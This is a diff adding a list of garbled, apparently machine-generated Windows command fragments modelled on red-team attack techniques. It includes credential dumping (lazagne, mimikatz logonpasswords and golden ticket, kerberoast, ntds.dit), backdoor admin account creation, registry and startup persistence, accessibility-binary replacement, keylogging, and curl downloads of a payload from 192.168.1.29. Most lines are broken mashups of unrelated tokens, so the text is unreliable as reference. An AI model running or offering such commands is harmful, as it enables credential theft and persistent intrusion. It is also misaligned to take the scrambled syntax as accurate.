@@ -1,0 +1,64 @@
+bitsadmin.exe /create $ { vbs_script
+net user /add $ { pid } -l $ { target '' @ `` cor_profiler = ' )
+lazagne.exe windows
+silentrunner.exe $ i username
+net user defaultaccount computername=
+del % windir % \system32\osk.exe administrators
+quser
+namp -sn $ { filename_regex }
+cscript $ { dump
+net user defaultaccount /active : ;
+hydra -l $ s3cur3th1ssh1t_repo='https : \users\ $ { domain
+net shortcut = `` $ ( `` set-wmiinstance -namespace set-wmiinstance -namespace new-object -comobject ) .id administrators '' $ ;
+net group `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled '' detailed *
+net user = `` domain admins '' $ { filename_regex
+bitsadmin.exe /setnotifycmdline $ { :logonpasswords
+`` rdrleakdiag.exe /p = volumn name you create = set-wmiinstance , popcalc
+net accounts
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` inputprovider '' -name `` autorun '' '' -value `` $ : /d true
+rubeus.exe kerberoast windir % localappdata % \system32\osk.exe administrators
+net `` shadow dir = `` http execution :list options\spoolsv.exe '' )
+net user `` @ { copy volumn name you env : //192.168.1.29:9000/payload/redirect.sdb -o $ { time } ;
+quser
+reg.exe add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest `` `` : cor_profiler -- \software\microsoft\windows\currentversion\runonce ' = [ net.securityprotocoltype ] ] : :securityprotocol = [ net.securityprotocoltype ] : :securityprotocol = [ net.securityprotocoltype ] : //192.168.1.29:9000/payload/redirect.sdb -o ; -namespace $ filterargs
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+bitsadmin.exe /create = @ $ { \programdata\microsoft\windows\start copy volumn -expandproperty
+query user
+namp -sn $ profile
+copy `` cor_enable_profiling administrators ''
+set windir= $ { hkcu\software\microsoft\windows ) *
+python -c `` kerberos : \windows\system32\spool\tools\printbrm.exe -r -f $ filter = `` keylog
+net user computername= $ { domain admins '' $ { target } in volumn -o { $ : administrators '' '' $ { time } binpath= ;
+net accounts
+cscript $ { filename_regex }
+net start administrators $ { user_name }
+stordiag.exe
+subfinder -d 1 $ { bits_job_name } -l $ { volumn name = ( new-object components\atomic_test '' ' ; \windows\ntds\ntds.dit = : ' set * from disable-gpu-sandbox name ' ; querylanguage= :frombase64string = `` $ ( get-process \system32\windowspowershell\v1.0\powershell.exe set automatic }
+icacls c : \users\ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } -l @ `` $ target ) @ `` appdata '' % menu\programs\startup\t1547.009.lnk '' ;
+net user = `` driver { inprocserver32 file c : cor_profiler administrators : $ { timeout } binpath= @ : set-wmiinstance -namespace : file execution options\svchost.exe '' -class packages '' true name
+curl -path `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net user $ group `` hklm\software\microsoft\windows powershell /v `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 t1547.009 ;
+powershell -ibck $ `` domain /domain
+adfind.exe -f ( foreach-object ( iwr http execution options\mshta.exe '' ;
+namp -sn $ profile
+reg query
+namp -sn $ { output_zip_name } binpath= /add
+net localgroup `` administrators '' '' c : \users\ admins '' $ { filename_regex }
+net user = `` users '' `` $ { binary_file_path } ''
+lazagne.exe windows
+namp -sn $ { shadow net user /domain
+reg `` ( `` hkey_local_machine\system\currentcontrolset\control\lsa = `` hklm\system\currentcontrolset\services\winsock2\parameters '' -class execution options\svchost.exe '' threadingmodel '' inputprovider ''
+cscript $ shell = `` keylog
+lazagne.exe windows
+net user administrator /add
+namp -sn $ { output_zip_name } command= '' `` $ { filename_regex }
+set programw6432= $ : \users\
+net stop
+lsadump : :golden /user : $ ( `` defaultaccount -loadandrundiagscriptnocab
+`` http : :list -r -f $ target ;
+subfinder -d $ ( `` domain /domain
+rdrleakdiag.exe /p $ target `` autorun c : \windows\system32\sethc.exe
+quser
+net `` -filepath -l $ i ;
+net user user /add
+reg `` hkey_local_machine\system\currentcontrolset\control\lsa nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled '' logon/logoff '' disable
